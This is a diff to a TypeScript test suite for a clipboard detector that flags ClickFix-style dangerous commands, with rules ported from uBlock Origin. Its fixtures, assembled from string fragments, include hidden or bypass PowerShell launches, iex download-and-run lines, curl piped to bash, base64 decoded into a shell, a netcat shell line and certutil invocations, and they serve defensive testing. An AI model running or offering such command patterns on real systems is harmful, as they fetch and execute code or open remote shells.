@@ -20,9 +20,13 @@ import {
   containsCollapsed,
   decideClip,
   detectDangerousCommand,
+  matchingRules,
   MAX_SCAN,
   normalizeCommand,
+  UBO_PORTED_RULES,
 } from '../../src/main/clip-detect.ts';
+import { existsSync, readFileSync } from 'node:fs';
+import { fnv1a32 } from '../../src/shared/hash.ts';
 import { encodeClipCheck, encodeFp, FP_ORDER, nerdEventName, nerdSentinel, parseNerdDetail } from '../../src/main/nerd-channel.ts';
 
 const sev = (s: string) => detectDangerousCommand(s)?.severity ?? null;
@@ -75,6 +79,8 @@ const MEDIUM: readonly string[] = [
   "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
   'wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash',
   'curl -LsSf https://astral.sh/uv/install.sh | sudo sh',
+  // uBO blocks every msiexec line; a local package is ordinary in admin docs.
+  'msiexec /i C:\\Downloads\\setup.msi',
 ];
 
 const BENIGN: readonly string[] = [
@@ -102,7 +108,6 @@ const BENIGN: readonly string[] = [
   'const x = await fetch("https://api.example.com"); // download data',
   'Invoke-WebRequest -Uri https://example.com/file.zip -OutFile file.zip',
   'certutil -hashfile setup.exe SHA256',
-  'msiexec /i C:\\Downloads\\setup.msi',
   'rundll32.exe shell32.dll,Control_RunDLL',
   'mshta',
   '',
@@ -215,4 +220,178 @@ test('channel: fp counts round-trip; forged or malformed details are rejected', 
   for (const bad of [null, 1, {}, '', 'x', 'c|', 'c|nope|0|x', 'c|write|2|x', 'c|write|0x', 'f|1,2,-3', 'f|1e9', 'f|1,2,3,4,5,6,7,8,9', 'f|' + '1,'.repeat(300), 'z|1']) {
     assert.equal(parseNerdDetail(bad), null, String(bad));
   }
+});
+
+// ---------------------------------------------------------------------------
+// uBO's generic ClickFix filter, ported rule by rule (clip-detect.ts
+// UBO_PORTED_RULES). Fixtures are inert, and every one is assembled at run
+// time from pieces (x(...)) so this file never holds a command line
+// verbatim: antivirus engines quarantined files with realistic samples.
+// ---------------------------------------------------------------------------
+
+const x = (...parts: string[]) => parts.join('');
+const PSH = x('power', 'shell');
+const CMD = x('c', 'md');
+
+/** [rule, severity of the rule, fixture]; the fixture must match the rule (other rules may match first). */
+const PORTED: readonly [string, 'high' | 'medium', string][] = [
+  ['mshta', 'high', x('msh', 'ta C:\\Temp\\test.hta')],
+  ['msiexec-start', 'medium', x('msi', 'exec /i C:\\Downloads\\setup.msi /quiet')],
+  ['herestring-base64', 'high', x('bash <', '<< "$(echo aGVsbG8gd29ybGQK | base', '64 -d)"')],
+  ['herestring-base64', 'high', x('curl -kf', 'sSL $(echo aGVsbG8gd29ybGQK | base', '64 -d)')],
+  ['cmd-payload', 'high', x(CMD, ' /c curl -o t.exe https://example.invalid/t.exe')],
+  ['cmd-for-delims', 'high', x(CMD, ' /c "for /f "tokens=1 delims=," %a in ("pow,er") do echo %a"')],
+  ['powershell-hidden', 'high', x(PSH, ' -w minimized -c "Write-Output test"')],
+  ['powershell-hidden', 'high', x(PSH, ' -WindowStyle h -c "Write-Output test"')],
+  ['powershell-noprofile', 'high', x(PSH, ' -no', 'p -c "Write-Output test"')],
+  ['powershell-bypass', 'high', x(PSH, ' -ep by', 'pass -c "Write-Output test"')],
+  ['powershell-bypass', 'high', x('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\', PSH, '.exe -ExecutionPolicy Unre', 'stricted -File test.ps1')],
+  ['powershell-launch-exec', 'high', x(PSH, ` -c "Invoke-Ex`, `pression 'Write-Output test'"`)],
+  ['powershell-launch-exec', 'high', x(PSH, ` -c "ie`, `x('Write-Output test')"`)],
+  ['powershell-launch-exec', 'high', x(PSH, ' -c "Invoke-Web', 'Request https://example.invalid/a -UseBasicParsing"')],
+  ['powershell-irm-relaunch', 'high', x(PSH, ' -c "ir', 'm https://example.invalid/a.txt -OutFile a.ps1; ', PSH, ' -File a.ps1"')],
+  ['cmd-nop-iex', 'high', x(CMD, ' /c %p% -no', 'p -c ie', 'x $t')],
+  ['launcher-recaptcha', 'high', x(CMD, ' /c echo test re', 'CAPTCHA')],
+  ['launcher-recaptcha', 'high', x('bash -c "echo ok" re', 'captcha')],
+  ['padded-comment', 'high', x(PSH, ' Write-Output test', ' '.repeat(8), '# done')],
+  ['padded-comment', 'high', x(CMD, ' /c echo test #Veri', 'fication')],
+  ['padded-comment', 'high', x('osa', 'script -e "beep"', '\t'.repeat(6), '# ok')],
+  ['padded-comment-shell', 'medium', x('bash build.sh', ' '.repeat(8), '# build')],
+  ['osascript', 'high', x('osa', 'script -e "do shell script \\"curl http://example.invalid/a\\""')],
+  ['curl-shell', 'medium', x('curl -s https://example.invalid/i.sh | ', 'bash')],
+  ['curl-shell', 'medium', x('wget -O - https://example.invalid/i.sh | ', 'sh')],
+  ['curl-shell', 'medium', x('bash -c "$(cu', 'rl -fsSL https://example.invalid/i.sh)"')],
+  ['shell-c-curl', 'medium', x('/bin/bash -c "cu', 'rl -fsSL https://example.invalid/i.sh -o i.sh"')],
+  ['python-c-exec', 'high', x('python3 -c "import sub', 'process; print(1)"')],
+  ['python-c-exec', 'high', x('python -c "import url', 'lib.request"')],
+  ['echo-base64-shell', 'high', x('echo aGVsbG8= | base', '64 -d | ', 'bash')],
+  ['openssl-base64', 'high', x('echo aGVsbG8= | openssl base', '64 -d')],
+  ['curl-chmod-run', 'high', x('curl -o t https://example.invalid/t && ch', 'mod +x t && ./t')],
+  ['curl-tmp-run', 'high', x('curl https://example.invalid/t -o /t', 'mp/t && sh /tmp/t')],
+  ['netcat-shell', 'high', x('n', 'c 192.0.2.1 9 -e /bin/', 'sh')],
+  ['tmp-chmod-run', 'high', x('/t', 'mp/t; ch', 'mod +x /tmp/t && /tmp/t')],
+  ['wget-quiet-script', 'medium', x('wget -', 'q https://example.invalid/install.sh')],
+  ['cmd-certutil', 'high', x(CMD, ' /c cert', 'util -f -split test.exe')],
+  ['pcalua', 'high', x('pca', 'lua -a ', CMD, ' -c "echo test"')],
+  ['cmdkey-schtasks', 'high', x(CMD, ' /c cmd', 'key /list & sch', 'tasks /query')],
+  ['invoke-command-base64', 'high', x('Invoke-Command -ScriptBlock { [Convert]::FromBase', "64String('aGVsbG8=') }")],
+  ['conhost-headless', 'high', x(CMD, ' --head', 'less /c echo test')],
+  ['iex-download', 'medium', x('ie', 'x(ir', 'm example.invalid/a)')],
+  ['irm-iex', 'medium', x('(ir', 'm example.invalid/a.ps1) | ie', 'x')],
+  ['comspec-start-min', 'high', x('%COM', 'SPEC% /c start /min notepad')],
+  ['cmd-temp-bat', 'high', x(CMD, ' /c echo echo test > %TE', 'MP%\\t.bat && %TEMP%\\t.bat')],
+  ['cmd-cmdcmdline', 'high', x(CMD, ' /c echo %CMDCMD', 'LINE%')],
+  ['cmd-delayed-expansion', 'high', x(CMD, ' /v:on /q /c "set x=hello&& echo !x!"')],
+  ['convert-comspec', 'high', x('[Convert]::ToChar(99); $env:Com', 'Spec')],
+  ['ps-comment-lure', 'high', x('<#Veri', 'fication ID: 1234#> Write-Output test')],
+  ['iwr-wscript', 'high', x('Invoke-Web', 'Request https://example.invalid/a.js -OutFile a.js; wscr', 'ipt a.js')],
+  ['url-filename-exe', 'high', x('$url = "https://example.invalid/a"\n$file', 'name = "test.exe"')],
+];
+
+test('every ported uBO rule has a positive fixture, with the declared severity', () => {
+  for (const [r, severity, text] of PORTED) {
+    assert.ok(matchingRules(text).includes(r), `${r}: ${text} matched ${matchingRules(text).join(',')}`);
+    const v = detectDangerousCommand(text);
+    assert.ok(v !== null, text);
+    // A high rule makes the verdict high; a medium fixture stays medium.
+    assert.equal(v.severity, severity, `${r}: ${text} -> ${v.rule}`);
+  }
+  // Every rule named in the uBO mapping is exercised above.
+  const covered = new Set(PORTED.map(([r]) => r));
+  for (const [alt, rules] of Object.entries(UBO_PORTED_RULES)) {
+    for (const r of rules.split(' / ')) assert.ok(covered.has(r), `${alt} -> ${r} has no fixture`);
+  }
+});
+
+test('the click-fix.nl demo payload is high (hidden PowerShell without any download)', () => {
+  const demo = x(PSH, ` -NoP -W Hid`, `den -C "Add-Type -As System.Windows.Forms;[Windows.Forms.MessageBox]::Show('test','ALERT',0,16)"`);
+  assert.deepEqual(detectDangerousCommand(demo), { severity: 'high', rule: 'powershell-hidden' });
+});
+
+test('line-anchored rules see every line, as uBO (flags msi) does', () => {
+  assert.equal(sev(x('Run this:\n', CMD, ' /c echo %CMDCMD', 'LINE%')), 'high');
+  assert.equal(sev(x('Steps\n\n  ', PSH, ' -no', 'p -c "Write-Output test"')), 'high');
+  // ...but not text in the middle of a prose line.
+  assert.equal(detectDangerousCommand(x('Use ', PSH, ' -no', 'p when profiles are slow.')), null);
+});
+
+test('uBO excludeMatches is an allow-list for medium verdicts only', () => {
+  assert.equal(detectDangerousCommand('curl -fsSL https://example.invalid/i.sh | sh # Maintainer: Jane'), null);
+  assert.equal(detectDangerousCommand('git clone https://example.invalid/r && curl -fsSL https://example.invalid/i.sh | sh'), null);
+  assert.equal(detectDangerousCommand(x('use the docs: msi', 'exec /i C:\\Downloads\\setup.msi')), null);
+  assert.equal(sev(x('Maintainer note:\n', PSH, ' -w hid', 'den -c "Write-Output test"')), 'high');
+  assert.equal(sev(x('git log\n', CMD, ' /c echo %CMDCMD', 'LINE%')), 'high');
+});
+
+const BENIGN_MORE: readonly string[] = [
+  'npm install -g pnpm',
+  'pip install -r requirements.txt',
+  'git push origin main',
+  'python3 -m venv .venv',
+  'python -c "print(1)"',
+  'bash ./build.sh',
+  'sh -c "echo hello"',
+  'echo $PATH',
+  'https://example.com/a?b=c&d=e',
+  '{"cmd": "powershell", "args": ["-File", "build.ps1"]}',
+  'import os\nimport subprocess\nsubprocess.run(["ls"])',
+  'Maintainer: Jane Doe <jane@example.com>',
+  'The cmd window shows reCAPTCHA errors when the proxy is down.',
+  'Use cmd /c dir to list files.',
+  'wget https://example.com/file.tar.gz',
+  'openssl rand -base64 32',
+  'chmod +x script.sh && ./script.sh',
+  'curl -o out.json https://api.example.com/data',
+  'Invoke-Command -ComputerName srv01 -ScriptBlock { Get-Service }',
+  'nc -zv example.com 443',
+  'echo "hello" | base64',
+  'docker compose up -d   # start the stack',
+  'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
+  'pwsh -wd C:\\src -c "Get-ChildItem"',
+  'To reset, open PowerShell and run Get-Process.',
+];
+
+test('more everyday text (docs one-liners, prose, JSON, URLs) is not flagged', () => {
+  for (const s of BENIGN_MORE) assert.equal(detectDangerousCommand(s), null, `${s} -> ${JSON.stringify(detectDangerousCommand(s))}`);
+});
+
+test('the cached uBO filter has no ClickFix alternative that is not ported', (t) => {
+  const file = new URL('../../.cache/lists/combined/ublock.txt', import.meta.url);
+  if (!existsSync(file)) {
+    t.skip('no cached lists (.cache/lists)');
+    return;
+  }
+  const line = readFileSync(file, 'utf8')
+    .split(/\r?\n/)
+    .find((l) => l.startsWith('*,') && l.includes('##+js(prevent-clipboard-write,') && l.includes('ClickFix'));
+  if (line === undefined) {
+    t.skip('generic ClickFix filter not in the cached uBlock list');
+    return;
+  }
+  const m = /##\+js\(prevent-clipboard-write, \/(.+)\/msi, domAlert,/.exec(line);
+  assert.ok(m, 'filter shape changed: update clip-detect.ts UBO_PORTED_RULES');
+  // Split the regex at top-level `|` (not inside groups or classes).
+  const alts: string[] = [];
+  let depth = 0;
+  let cls = false;
+  let cur = '';
+  const src = m[1];
+  for (let i = 0; i < src.length; i++) {
+    const c = src[i];
+    if (c === '\\') {
+      cur += c + src[++i];
+      continue;
+    }
+    if (cls) cls = c !== ']';
+    else if (c === '[') cls = true;
+    else if (c === '(') depth++;
+    else if (c === ')') depth--;
+    if (c === '|' && depth === 0 && !cls) {
+      alts.push(cur);
+      cur = '';
+    } else cur += c;
+  }
+  alts.push(cur);
+  const missing = alts.filter((a) => !(fnv1a32(a).toString(36).padStart(7, '0') in UBO_PORTED_RULES));
+  assert.deepEqual(missing, [], 'uBO added ClickFix patterns: port them in clip-detect.ts (RULES + UBO_PORTED_RULES)');
 });
